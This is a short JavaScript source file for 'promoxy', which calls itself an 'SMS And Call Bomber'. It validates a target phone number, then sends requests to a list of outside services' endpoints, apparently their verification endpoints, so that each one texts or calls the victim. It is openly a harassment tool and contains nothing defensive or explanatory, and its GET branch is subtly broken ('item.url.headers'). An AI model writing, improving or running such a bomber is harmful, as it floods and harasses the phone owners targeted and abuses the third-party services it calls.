//   promoxy 	: 	SMS And Call Bomber
//   Author 	: 	jxroot 
//   Version 	: 	1
//   Github 	: 	https://github.com/jxroot/promoxy
const axios = require('axios')
const list = require('./list')
const validate = list.number.search(/^9\d{9}$/i);
if (validate == 0) {
    list.api.forEach(function (item) {
        if ("headers" in item) {
            var headers = item.headers
        } else {
            var headers = {}

        }
        if (item.method == "POST") {
            axios.post(item.url, item.data, headers).then(function () {
                console.log(item.name);
            }).catch(error => {
                console.log("ERROR");


            })


        }

        else {
            axios.get(item.url.headers).then(function () {
                console.log(item.name);

            }).catch(error => {

                console.log("ERROR");

            })
        }




    })
} else {
    console.log("Invalid Format");
}

